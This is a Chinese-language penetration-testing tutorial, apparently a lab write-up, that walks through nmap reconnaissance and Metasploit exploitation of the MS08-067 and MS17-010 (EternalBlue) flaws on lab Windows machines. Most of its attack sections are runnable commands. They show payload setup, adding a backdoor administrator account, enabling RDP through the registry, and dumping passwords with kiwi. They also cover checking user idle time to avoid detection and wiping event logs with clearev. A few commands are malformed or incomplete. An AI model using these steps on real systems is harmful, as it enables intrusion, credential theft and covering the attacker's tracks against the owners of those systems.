# 网络安全报告

## 一、侦察确定目标主机

我们一般使用 Kali Linux 对目标机发起攻击，Kali Linux 上集成了很多攻击工具，例如 `nmap`，后续的操作都在 Linux 上完成。

### 1.1 批量扫描一个网段的主机存活数

通过 `namp` 工具可以扫描指定的 IP，当然也可以扫描某一个段下的全部 IP，使用方式如下：

```shell
nmap -sP 192.168.60.1/21
```

还可指定一个范围内的 IP 地址，使用方式如下：

```shell
nmap -sP 192.168.60.20-100
```

### 1.2 扫描时跳过 ping 探测

有些主机关闭了 ping 检测，对于这些关闭了 ping 检测的主机，我们应该直接跳过他们以加快扫描速度，只需带上 `-P0` 参数即可，使用方式如下：

```shell
nmap -P0 192.168.60.76
```

### 1.3 端口检测

在得到目标主机的 IP 地址后，我们需要进行进一步的侦察。想要入侵进对方电脑，那么了解对方开放了哪些端口是很有必要的，这对我们攻入对方主机有很大的帮助，甚至可以借助端口操控对方电脑，获取我们想要的信息。因此我们需要进行端口检测查看对方开放了哪些端口。

通过 `nmap` 检测端口的方式如下：

```shell
nmap -P 192.168.60.51
```

除了使用上述命令进行端口检测外我们还可以使用下列命令进行段口检测：

```shell
nmap -sS 192.168.60.51
```

## 二、查找漏洞

使用 `nmap` 和漏洞利用工具 `msfconsole` 来发现目标主机的系统漏洞和软件服务漏洞。

打开终端输入如下命令：

```shell
nmap --script = vuln 目标机IP
```

扫描结束之后会得到一个 host script results，这个返回结果就是该主机存在的漏洞。

搜索目标主机漏洞名称，以 `ms10-054 ` 漏洞为例，在命令行下输入一下命令：

```shell
search ms10-054
```

我们就获得了数据库所有与 `ms10-054` 有关的漏洞。

## 三、利用漏洞进行攻击

这里以 `ms08-067` 漏洞和 `ms17-010` 漏洞为例演示攻击过程。

### 3.1 ms08-067 漏洞

#### 3.1.1 环境准备

-   **受害机：**Windows XP SP1 镜像。
-   **攻击机：**Kali 系统。

第一步，在虚拟机中安装 Windows XP SP1 系统和 Kali 系统。

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-95fb78d490c40f91f2c662999742bc24.jpg)

第二步，虚拟机两个系统之间能够相互通信。

-   **Kali：**192.168.44.136
-   **Win XP：**192.168.44.135

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-c47e5babc2a6841e76515a6d0795ad8b.jpg)

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-9b9a35a174d8f6b2c91ccdcc3412d7a2.jpg)

第三步，打开 Windows XP 系统，确定 445 端口开启。如下图所示，在 Win XP 的 CMD 中输入 `netstat -sn` 查看端口 445 是否打开。

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-cd8d094584755b6013e5d179f38f1f10.jpg)

第四步，关闭 Windows XP 系统的防火墙。

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-50a1d64f6901dfe34f22f267ad88d16a.jpg)

做完这些初始准备之后，我们开始利用 Kali 系统进行漏洞复现。

#### 3.1.2 开始攻击

第一步，利用 `nmap` 工具扫描端口及确认该漏洞是否存在。

`nmap` 漏扫脚本目录为 `/usr/share/nmap/script/`，如下图所示，扫描结果为 VULNERABLE，表示 `ms08-067`漏洞存在且可以利用。

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-6027d55fdcc8b5a881fce1afafe824c2.jpg)

第二步，进入 Msfconsole 并利用 search 语句查找漏洞利用模块。终端内输入 `msfconsole` 打开 `metasploite` 命令行客户端，使用 `search` 命令查找 `ms08-067` 的漏洞利用模块。

```shell
msfconsole
search ms08-067
```

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-082aa42f6e0f818d3ec28c71eb50c7c7.jpg)

第三步，进入漏洞模块，并查看相关的使用说明。

使用 `use` 命令选择我们要使用的利用模块。`target` 设置为系统默认是自动定位，如果需要精确定位，可以 `show targets` 查看所有，然后进行选择。

```shell
use exploit/windows/smb/ms08_067_netapi
show options
show targets
```

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-fe8c08cb34c9138c12e0bce6a017677a.jpg)

第四步，设置攻击机、受害机信息。

```shell
# 目标机ip
set RHOST 192.168.44.135
# 端口号
set RPORT 445
# 设置payload
set payload generic/shell_bind_tcp
# 攻击机ip
set LHOST 192.168.44.136
# 设置自动类型
set target 0
# 显示配置信息
show options
```

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-aa9c47f656d5e148d55aa49c4c6d8b2b.jpg)

第五步，运行 exploit 反弹 shell。此时我们成功获取了 Windows XP 系统的 Shell，我们调用 `ipconfig` 查看的 IP 地址也是目标的 `192.168.44.135`。

```shell
exploit
session 1
ipconfig
pwd
```

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-006a65fc098ff3370ff4fe535d5843b6.jpg)

第六步，在目标主机上创建文件夹及文件。

```shell
cd ..
# 创建文件夹
mkdir hacker
# 访问目录
dir
cd hacker
# 创建文件并写入内容
echo eastmount>test.txt
# 查看目标系统的基本信息
sysinfo
```

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-a4376b7b816e75657bc9d719789decd1.jpg)

显示结果下图所示：

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-ad5a2442016ae352e7289dd375f461a4.jpg)

第七步，对目标 XP 主机进行深度提权。

```shell
# 增加普通用户
net user hacker 123456 /add
# 提升管理员权限
net localgroup administrators hacker /add
```

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-eadd77184ee76f93bbe79698205b8687.jpg)

此时被攻击的主机新增 `hacker` 管理员如下图所示：

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-a44241c3735bc8b97427e87a0a515b64.jpg)

第八步，开启远程连接 3389 端口并进行远程操作。

```shell
# 开启远程连接
echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f > C:\WINDOWS\system32\3389.bat && call 3389.bat
# 查看网络端口
netstat -an
# 远程连接
rdesktop 192.168.44.135
```

首先查看端口，发现目标主机 Windows XP 并未开启 3389 端口。

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-0ce75c1dcbd7a07ca06a06f959cc22cf.jpg)

输入命令开启远程连接端口。

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-518f417edbadea1bd93da7504db511c9.jpg)

接着输入 `rdesktop 192.168.44.135` 连接远程 IP 地址，并输入我们创建好的 hacker 用户名及密码。

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-939fd0b6922641ea9a8480caf34a7648.jpg)

输入创建的用户名 hacker 和密码 123456 回车，弹出提示框点击 OK，稍等就会成功远程登录 XP 系统。

![](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677047460-d9b2cf06fb0caebc57661308e5f8ef4a.jpg)

### 3.2 ms17-010 漏洞

#### 3.2.1 准备工作

-   靶机：Windows server（IP:192.168.178.128）
-   攻击机：Kali（IP:192.168.178.131）

#### 3.2.2 开始攻击

用 `nmap` 的漏洞扫描模式。

```shell
nmap --script=vuln 192.168.178.128
```

可以发现，靶机上扫到了 4 个漏洞，其中包括了 `ms17-010`。

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-eb0532066f7031da47d01ef135024426.png)

打开 `metasploit`：

```shell
msfconsole
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-eb3f96e7e4ef2eb76a27ede1d5ba5542.png)

搜索 `ms17-010` 相关模块，可以看到一共找到了 6 个不同的模块。

```shell
search ms17-010
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-e22445af8b307fc3b69bd29df1cd0a6d.png)

加载扫描模块。

```shell
use auxiliary/scanner/smb/smb_ms17_010
```

查看配置选项

```shell
show options
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-cfffff8bf9128e3d2d3cd309d336b64d.png)

RHOSTS 显示远程主机未配置，配置目标主机。

```shell
set rhosts 192.168.178.128
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-ec1f84d2813a6edea93e864c89795b8c.png)

开始扫描漏洞，再次证实靶机存在 MS17-010 漏洞。

```shell
exploit
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-d22ecc14d79a259f4d1493027f5a7bba.png)

使用永恒之蓝攻击模块：`exploit/windows/smb/ms17_010_eternalblue` ，并设置攻击载荷：

```shell
set payload
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-aa7640a5de6e2de1ede3bc6a09cb8cfb.png)

查看选项并设置 rhosts:

```shell
set rhosts 192.168.178.128
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-8a20d72e13e604d06420e0428b570fb2.png)  
输入 exploit 开始攻击。  
![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-a5d061f19b1a43cb105642ac575adfab.png)  
**运行成功会出现 meterpreter >  
Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，  
对目标系统进行更深入的渗透，如获取屏幕、上传/下载文件、创建持久后门等。**

演示几个功能

1.  捕获屏幕

```shell
 meterpreter > screenshot
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-842bd9eec73227b88f015e8723003989.png)  
![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-aa252fad11992c7a6cc7800d6e1e5774.png)

2.  上传/下载文件

```
meterpreter > upload hello.txt c://
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-7f6c595021d1b94115cd76e24717ca39.png)  
![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-d94798fd72024a73d9a00abdd4096e44.png)

```shell
meterpreter > download d://1.txt
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-0485e0a4e8a8b23d5a70cb6777ba6c90.png)  
![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-0655ba4eb06b30aace4933b7dff27cd0.png)

3.  远程桌面

```shell
meterpreter > run vnc
```

启动失败了- -好像是靶机没有启动 vnc 服务。  
![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-34c0f8613acdb13adcbc6674cf40758a.png)

4.  获取 cmd,出现了编码问题。

```shell
meterpreter > shell
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-765c777062ba4cfcba0c022a86707a3b.png)

5.  获取用户密码

```shell
meterpreter > load kiwi
Loading extension kiwi...Success.
```

完成进程迁移后:

```shell
meterpreter > creds_all
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-cded31ac7e925c81b488c30f2760db37.png)

6.  启用远程桌面，配合上一步获取到的密码。

```shell
meterpreter > run post/windows/manage/enable_rdp
```

使用时一般配合查看远程用户的空闲时长，空闲时间长再进行远程登陆，减小被发现的风险。_登录 rdp 会把对方顶掉。_

```shell
meterpreter > idletime
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-92c74096d4393eceb99b907a9460b25a.png)  
使用 rdesktop 命令远程连接桌面

```shell
root@kali:~# rdesktop 192.168.2.6
```

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-befdbf4348fe59add1b0eb60611f22ae.png)  
用上一步获取的账户密码进行登录，登录成功。  
![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-1be8a5de1dfbf09f7fad9f05f4a38446.png)

7.  清除日志

```shell
meterpreter > clearev
```

清除日志前，靶机的事件查看器是这样的。（记录了大量的事件）  
![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-eae5422a4d7be4d80c8b963eb95e6d8d.png)  

![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-0d69800e9388f2cad633407642e582a1.png)  
被清空了~  
![在这里插入图片描述](https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/8919/1677139697-3eb0b27b09ee23637542f84f96bce258.png)  
